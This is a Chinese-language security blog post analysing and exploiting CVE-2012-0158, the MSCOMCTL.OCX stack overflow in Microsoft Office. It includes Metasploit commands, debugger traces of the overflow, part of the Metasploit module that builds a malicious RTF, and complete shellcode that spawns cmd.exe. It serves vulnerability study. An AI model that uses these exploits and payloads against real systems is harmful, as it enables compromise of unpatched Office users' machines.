{"title":"CVE-2012-0158的分析与利用","date":"2018-09-20T02:54:17.000Z","slug":"CVE-2012-0158的分析与利用","updated":"2018-09-20T14:40:50.000Z","content":"<h3 id=\"exp生成\"><a href=\"#exp生成\" class=\"headerlink\" title=\"exp生成\"></a>exp生成</h3><p>首先可以利用了metasploit生成一个能够弹计算器的样本.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">search CVE-2012-0158</span><br><span class=\"line\">use exploit/windows/fileformat/ms12_027_mscomctl_bof</span><br><span class=\"line\">set PAYLOAD windows/exec</span><br><span class=\"line\">set CMD calc.exe</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure></p>\n<p>这样的话我们就得到了一个能够弹计算机的一个样本.</p>\n<p>测试环境:</p>\n<p>操作系统 : windows 7 sp1<br>office版本: office 2007<br>工具: windbg+x32dbg+010editor+oletools </p>\n<p>可以顺利的弹出计算器.</p>\n<p><img src=\"/img/cal.png\" alt=\"计算器弹出\"></p>\n<h3 id=\"动态调试\"><a href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h3><p>网上很多的分析都是基于知道漏洞的溢出点在MSCOMCTL.OCX,然后通过栈回溯回溯到溢出点.但是在网络上没有任何的资料的时候,该怎么以一种另外的方式来分析这个漏洞呢,我在一篇文章(<a href=\"https://zhuanlan.kanxue.com/article-501.htm\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.kanxue.com/article-501.htm</a>) 中看到一种方法.</p>\n<blockquote>\n<p>方法是：对这块栈下写入记录断点，根据断点输出情况来分析。但是这个断点会影响效率，所以我们尽可能晚的去下记录断点。我们在准备打开文件时Ctrl+Break抛出一个断点。然后下断ba w 4 0x12165C “r eip;gc”</p>\n</blockquote>\n<p>先通过windbg附加,然后通过栈回溯找到shellcode执行处,最后通过写入断点直接打到漏洞溢出的地方,这个方法非常的恰当,但是当我执行的时候发现了一个问题.</p>\n<p>那就是:win7中栈开启了aslr,这个栈是在变化的,而且没有固定的offset,无法确定写入栈的地址.</p>\n<p>这就让我有一丝的小尴尬,我想了一段时间,突然在win32dbg的日志窗口中发现了如下日志:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在模块 mscomctl.ocx 中没有找到任何支持的调试类型！</span><br><span class=\"line\">DLL已载入： 27580000 C:\\Windows\\SysWOW64\\MSCOMCTL.OCX</span><br><span class=\"line\">线程 8F0 已启动，入口： winspool.734146FA</span><br><span class=\"line\">DLL已载入： 0EBE0000 C:\\Windows\\SysWOW64\\calc.exe</span><br><span class=\"line\">DLL已卸载： 0EBE0000 calc.exe</span><br></pre></td></tr></table></figure></p>\n<p>我突然想到,通过日志中的dll载入对载入的dll依次进行dll断点不就可以么,只要在cal.exe弹出前断下点即可.</p>\n<p>所以我首先加入了MSCOMCTL.OCX载入断点.</p>\n<p><img src=\"/img/bp1.png\" alt=\"dll断点\"></p>\n<p>之后通过不断的步进步入,终于在\bwwlib.dll的如下语句进入到了MSCOMCTL.OCX的范围内:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">69BD2900 | 50                       | push eax                                               |</span><br><span class=\"line\">69BD2901 | FF51 18                  | call dword ptr ds:[ecx+18]                             |</span><br></pre></td></tr></table></figure></p>\n<p>进入到MSCOMCTL.OCX领空之后\b需要细致的调试,不断步入,最后到达如下\b语句:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">27583C30 | FFE4                     | jmp esp                                                |</span><br></pre></td></tr></table></figure></p>\n<p>好,完美,到达我们的ret的rop跳转上了.这样的话我们分析之前的那个函数就可以了.</p>\n<p>通过调试我们可以发现如\b\b执行了如下语句栈被溢出:<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> __<span class=\"function\">stdcall <span class=\"title\">sub_275C89C7</span><span class=\"params\">(<span class=\"keyword\">int</span> a1, BSTR bstrString)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ...</span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = bstrString;</span><br><span class=\"line\">  result = sub_275C876D((<span class=\"keyword\">int</span>)&amp;v5, bstrString, <span class=\"number\">0xC</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( result &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v5 == <span class=\"number\">0x6A626F43</span> &amp;&amp; dwBytes &gt;= <span class=\"number\">8</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = sub_275C876D((<span class=\"keyword\">int</span>)&amp;v7, v2, dwBytes);</span><br><span class=\"line\">    ...</span><br></pre></td></tr></table></figure></p>\n<p>继续分析sub_275C876D()<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">if ( v6 &gt;= 0 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        qmemcpy((void *)a1, lpMema, dwBytes);</span><br><span class=\"line\">        ...</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure></p>\n<p>a1, lpMema, dwBytes\b三个参数都是从栈上传进来的参数,dwBytes\b表示qmemcpy的\b字节数.</p>\n<p>调试的时候我们发现dwBytes\b是从\brtf文件中读取进来的.</p>\n<p><img src=\"/img/dw.png\" alt=\"dw\"></p>\n<p>我们再看sub_275C89C7中的判断语句if ( v5 == 0x6A626F43 &amp;&amp; dwBytes &gt;= 8 ),这就很尴尬了,明明是&lt;=8,这里竟然变成了&gt;=8,\b难怪各位大佬要说这个是微软后门了….</p>\n<p>利用x32dbg动调的话可以非常清楚的看到栈是如何被溢出的.</p>\n<p><img src=\"/img/over4.png\" alt=\"ov\"></p>\n<p><img src=\"/img/over2.png\" alt=\"over2\"></p>\n<p><img src=\"/img/over3.png\" alt=\"over3\"></p>\n<p>总体来说这个漏洞算是非常简单的一个漏洞了,没有华丽的手法,只有非常朴实的栈溢出和一句话的rop,但是这个漏洞确实非常的耐用,windows7+office2007的版本在今天来说都能够拥有广大的使用群众,所以这个漏洞的影响力可以说是非常大了.</p>\n<p>动态调试的时候需要一些耐心,感觉dll载入断点还是一个比较有用的一个方法吧.</p>\n<p>metasploit生成shellcode有一段解码的过程,这就不详细说明了.</p>\n<h3 id=\"静态分析\"><a href=\"#静态分析\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h3><p>动态调试我大致知道了这个漏洞的触发流程,但是该样本是如何构造的呢,这里我用的metasploit生成的是个doc文档,但是我打开它的时候发现这是一个rtf文件,</p>\n<p><img src=\"/img/rtf.png\" alt=\"rtf\"></p>\n<p>然后我利用oletools的rtfobj对该文件进行了解压.然后利用010editor打开msf.doc_object_000000A0.bin</p>\n<p><img src=\"/img/rtfobj.png\" alt=\"rtf2\"></p>\n<p>我之前在动态分析的时候发现了如下语句<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v5 == <span class=\"number\">0x6A626F43</span> &amp;&amp; dwBytes &gt;= <span class=\"number\">8</span> )</span><br></pre></td></tr></table></figure></p>\n<p>查找字符6A626F43</p>\n<p><img src=\"/img/Cobj.png\" alt=\"rtf3\"></p>\n<p>这样的话定位到了关键的Cobj字符和接下来的shellcode.</p>\n<h3 id=\"构造样本\"><a href=\"#构造样本\" class=\"headerlink\" title=\"构造样本\"></a>构造样本</h3><h4 id=\"构造xls文件\"><a href=\"#构造xls文件\" class=\"headerlink\" title=\"构造xls文件\"></a>构造xls文件</h4><p>在 <a href=\"https://weiyiling.cn/one/cve_2012_0158_ms12-027\" target=\"_blank\" rel=\"noopener\">https://weiyiling.cn/one/cve_2012_0158_ms12-027</a> 这篇博客里,博主把该漏洞分析的非常之清晰,而且这也是我目前唯一找到的一篇分析listview的文章.文章中通过添加Microsoft ListView Control控件,并通过vba对该控件的长度进行扩容,最后通过动调一步一步的改变xls的内容进行样本的构造,视频中讲的十分的清晰.所以这里我也就不写构造的过程了.</p>\n<p>但是我在word中失败了,通过word添加控件之后并不会像excel中直接将listview暴露出来,而是感觉像是做了一个压缩.<br>通过oletools的oledir进行查看,发现我创建的doc是存在listview这个控件的.</p>\n<p><img src=\"/img/wordole.png\" alt=\"rtf\"></p>\n<h4 id=\"利用metasploit脚本构造rtf文件\"><a href=\"#利用metasploit脚本构造rtf文件\" class=\"headerlink\" title=\"利用metasploit脚本构造rtf文件\"></a>利用metasploit脚本构造rtf文件</h4><p>metasploit脚本可供我们自定义shellcode,脚本大致如下(exploits/windows/fileformat/ms12_027_mscomctl_bof.rb):<br><figure class=\"highlight rb\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##</span></span><br><span class=\"line\"><span class=\"comment\"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class=\"line\"><span class=\"comment\"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class=\"line\"><span class=\"comment\">##</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MetasploitModule</span> &lt; Msf::Exploit::<span class=\"title\">Remote</span></span></span><br><span class=\"line\">  Rank = AverageRanking</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">include</span> Msf::Exploit::FILEFORMAT</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">stream</span><span class=\"params\">(bytes)</span></span></span><br><span class=\"line\">    Rex::Text.to_hex(bytes).gsub(<span class=\"string\">\"\\\\x\"</span>, <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">junk</span><span class=\"params\">(n=<span class=\"number\">1</span>)</span></span></span><br><span class=\"line\">    tmp = []</span><br><span class=\"line\">    value = rand_text(<span class=\"number\">4</span>).unpack(<span class=\"string\">\"L\"</span>)[<span class=\"number\">0</span>].to_i</span><br><span class=\"line\">    n.times &#123; tmp &lt;&lt; value &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tmp</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exploit</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    ret_address = stream([target.ret].pack(<span class=\"string\">\"V\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> target[<span class=\"string\">'Rop'</span>]</span><br><span class=\"line\">      shellcode = stream(create_rop_chain)</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">      <span class=\"comment\"># To avoid shellcode being corrupted in the stack before ret</span></span><br><span class=\"line\">      shellcode = stream(make_nops(target[<span class=\"string\">'Offset'</span>]))</span><br><span class=\"line\">      shellcode &lt;&lt; stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, <span class=\"string\">\"jmp $+6\"</span>).encode_string)</span><br><span class=\"line\">      shellcode &lt;&lt; stream(make_nops(<span class=\"number\">4</span>))</span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\">    shellcode &lt;&lt; stream(payload.encoded)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> shellcode.length &lt; <span class=\"number\">2378</span></span><br><span class=\"line\">      shellcode += <span class=\"string\">\"0\"</span></span><br><span class=\"line\">    <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">    content = <span class=\"string\">\"&#123;\\\\rtf1\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#123;\\\\fonttbl&#123;\\\\f0\\\\fnil\\\\fcharset0 Verdana;&#125;&#125;\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"\\\\viewkind4\\\\uc1\\\\pard\\\\sb100\\\\sa100\\\\lang9\\\\f0\\\\fs22\\\\par\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"\\\\pard\\\\sa200\\\\sl276\\\\slmult1\\\\lang9\\\\fs22\\\\par\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#123;\\\\object\\\\objocx\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#123;\\\\*\\\\objdata\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"\\n\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"00000000000000000E0000\"</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"000000000000\"</span></span><br><span class=\"line\">    content &lt;&lt; ret_address</span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"9090909090909090\"</span></span><br><span class=\"line\">    content &lt;&lt; shellcode</span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"</span></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    </span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"\\n\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#125;\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#125;\"</span></span><br><span class=\"line\">    content &lt;&lt; <span class=\"string\">\"&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    print_status(<span class=\"string\">\"Creating '<span class=\"subst\">#&#123;datastore[<span class=\"string\">'FILENAME'</span>]&#125;</span>' file ...\"</span>)</span><br><span class=\"line\">    file_create(content)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"shellcode编写\"><a href=\"#shellcode编写\" class=\"headerlink\" title=\"shellcode编写\"></a>shellcode编写</h3><p>我编写的shellcode较少,不太会各种技巧…所以这里就用最简单的一些shellcode来填充好了,因为函数地址写死了,所以应该存在兼容性问题.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;\\x33\\xc0&quot;                          # XOR EAX,EAX</span><br><span class=\"line\">&quot;\\x50&quot;                              # PUSH EAX      =&gt; padding for lpCaption</span><br><span class=\"line\">&quot;\\x68\\x36\\x36\\x36\\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class=\"line\">&quot;\\x8B\\xCC&quot;                          # MOV ECX,ESP   =&gt; PTR to lpCaption</span><br><span class=\"line\">&quot;\\x50&quot;                              # PUSH EAX      =&gt; padding for lpText</span><br><span class=\"line\">&quot;\\x68\\x36\\x36\\x36\\x36&quot;              # PUSH &quot;666!&quot;</span><br><span class=\"line\">&quot;\\x68\\x36\\x36\\x36\\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class=\"line\">&quot;\\x68\\x36\\x36\\x36\\x36&quot;              # PUSH &quot;6666&quot;</span><br><span class=\"line\">&quot;\\x8B\\xD4&quot;                          # MOV EDX,ESP   =&gt; PTR to lpText</span><br><span class=\"line\">&quot;\\x50&quot;                              # PUSH EAX - uType=0x0</span><br><span class=\"line\">&quot;\\x51&quot;                              # PUSH ECX - lpCaption</span><br><span class=\"line\">&quot;\\x52&quot;                              # PUSH EDX - lpText</span><br><span class=\"line\">&quot;\\x50&quot;                              # PUSH EAX - hWnd=0x0</span><br><span class=\"line\">&quot;\\xBE\\x1E\\xFD\\x53\\x76&quot;              # MOV ESI,USER32.2</span><br><span class=\"line\">&quot;\\xFF\\xD6&quot;                          # CALL ESI</span><br><span class=\"line\">&quot;\\x50&quot;                              # PUSH EAX</span><br><span class=\"line\">&quot;\\xBE\\x10\\x7A\\xAC\\x75&quot;              # MOV ESI,KENREL32.EXITPROCESS</span><br><span class=\"line\">&quot;\\xFF\\xD6&quot;                          # CALL ESI</span><br></pre></td></tr></table></figure></p>\n<p>利用上面的构造xls文件方法进行样本的构造,并且把shellcode写入,能够成功的弹出6666的对话框和正常的退出excel.</p>\n<p><img src=\"/img/popup.png\" alt=\"popup\"></p>\n<h4 id=\"通用型shellcode\"><a href=\"#通用型shellcode\" class=\"headerlink\" title=\"通用型shellcode\"></a>通用型shellcode</h4><p>来自<a href=\"http://shell-storm.org/shellcode/files/shellcode-662.php\" target=\"_blank\" rel=\"noopener\">http://shell-storm.org/shellcode/files/shellcode-662.php</a><br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">Title: Allwin WinExec cmd.exe + ExitProcess Shellcode - 195 bytes</span></span><br><span class=\"line\"><span class=\"comment\">Date: 2010-06-25</span></span><br><span class=\"line\"><span class=\"comment\">Author: RubberDuck</span></span><br><span class=\"line\"><span class=\"comment\">Web: http://bflow.security-portal.cz</span></span><br><span class=\"line\"><span class=\"comment\">Tested on: Win 2k, Win 2003, Win XP Home SP2/SP3 CZ/ENG (32), Win Vista (32)/(64), Win 7 (32)/(64), Win 2k8 (32)</span></span><br><span class=\"line\"><span class=\"comment\">Thanks to: kernelhunter, Lodus, Vrtule and others</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> shellcode[]=</span><br><span class=\"line\">    <span class=\"string\">\"\\xFC\\x33\\xD2\\xB2\\x30\\x64\\xFF\\x32\\x5A\\x8B\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x33\\xC9\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\xB1\\x18\\x33\\xFF\\x33\\xC0\\xAC\\x3C\\x61\\x7C\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x03\\xF8\\xE2\\xF0\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x81\\xFF\\x5B\\xBC\\x4A\\x6A\\x8B\\x5A\\x10\\x8B\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x12\\x75\\xDA\\x8B\\x53\\x3C\\x03\\xD3\\xFF\\x72\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x34\\x8B\\x52\\x78\\x03\\xD3\\x8B\\x72\\x20\\x03\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\xF3\\x33\\xC9\\x41\\xAD\\x03\\xC3\\x81\\x38\\x47\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x65\\x74\\x50\\x75\\xF4\\x81\\x78\\x04\\x72\\x6F\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x63\\x41\\x75\\xEB\\x81\\x78\\x08\\x64\\x64\\x72\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x65\\x75\\xE2\\x49\\x8B\\x72\\x24\\x03\\xF3\\x66\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x8B\\x0C\\x4E\\x8B\\x72\\x1C\\x03\\xF3\\x8B\\x14\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x8E\\x03\\xD3\\x52\\x68\\x78\\x65\\x63\\x01\\xFE\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x4C\\x24\\x03\\x68\\x57\\x69\\x6E\\x45\\x54\\x53\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\xFF\\xD2\\x68\\x63\\x6D\\x64\\x01\\xFE\\x4C\\x24\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x03\\x6A\\x05\\x33\\xC9\\x8D\\x4C\\x24\\x04\\x51\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\xFF\\xD0\\x68\\x65\\x73\\x73\\x01\\x8B\\xDF\\xFE\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x4C\\x24\\x03\\x68\\x50\\x72\\x6F\\x63\\x68\\x45\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x78\\x69\\x74\\x54\\xFF\\x74\\x24\\x20\\xFF\\x54\"</span></span><br><span class=\"line\">    <span class=\"string\">\"\\x24\\x20\\x57\\xFF\\xD0\"</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Size = %d\\n\"</span>, <span class=\"built_in\">strlen</span>(shellcode));</span><br><span class=\"line\"> </span><br><span class=\"line\">    system(<span class=\"string\">\"PAUSE\"</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    ((<span class=\"keyword\">void</span> (*)())shellcode)();</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>该漏洞利用方式比较简单,但是越简单的漏洞通用型就越高,之前对windows下的漏洞分析较少,现在看来windows下的漏洞确实更有趣些.office的大洞有很多,自己还需慢慢努力.</p>\n<h3 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h3><p><a href=\"https://weiyiling.cn/one/cve_2012_0158_ms12-027\" target=\"_blank\" rel=\"noopener\">https://weiyiling.cn/one/cve_2012_0158_ms12-027</a><br><a href=\"http://www.youngroe.com/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/\" target=\"_blank\" rel=\"noopener\">http://www.youngroe.com/2016/05/23/Debug/debug-vulner-stackoverflows-2012-0158/</a><br><a href=\"https://zhuanlan.kanxue.com/article-501.htm\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.kanxue.com/article-501.htm</a><br><a href=\"https://www.anquanke.com/post/id/91643\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/91643</a><br><a href=\"http://shell-storm.org/shellcode/files/shellcode-662.php\" target=\"_blank\" rel=\"noopener\">http://shell-storm.org/shellcode/files/shellcode-662.php</a></p>\n","prev":{"title":"离职小记","slug":"离职小记"},"next":{"title":"linux内核下的内存管理笔记","slug":"linux内核下的内存管理笔记"},"link":"https://foyjog.github.io/post/CVE-2012-0158的分析与利用/"}